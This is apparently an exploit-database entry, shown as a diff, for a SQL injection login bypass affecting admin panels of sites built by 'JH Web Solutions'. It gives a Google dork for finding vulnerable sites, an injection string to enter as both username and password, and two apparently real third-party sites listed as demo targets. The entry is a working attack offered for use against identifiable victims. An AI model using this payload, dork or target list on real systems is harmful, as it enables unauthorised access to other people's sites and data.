@@ -1,0 +1,20 @@
+*********************************************************
+#Exploit Title: JH Web Solutions -  Bypas Sql Login Vulnerability
+#Date: 2022-07-11
+#Exploit Author: Lutfie404
+#Google Dork: intext:"Developed By : JH Web Solutions"
+#The Login URL is: site.com/admin
+#Category:webapps
+
+*********************************************************
+Proof of Concept:
+Search google Dork: intext:"Developed By : JH Web Solutions"
+
+Login With This Detail:
+user: ' or 1=1 limit 1 -- -+ 
+password: ' or 1=1 limit 1 -- -+
+
+*********************************************************
+### Demo Site :
+https://www.imperialsuitesinn.com/admin/
+https://www.rabsa.net/admin/
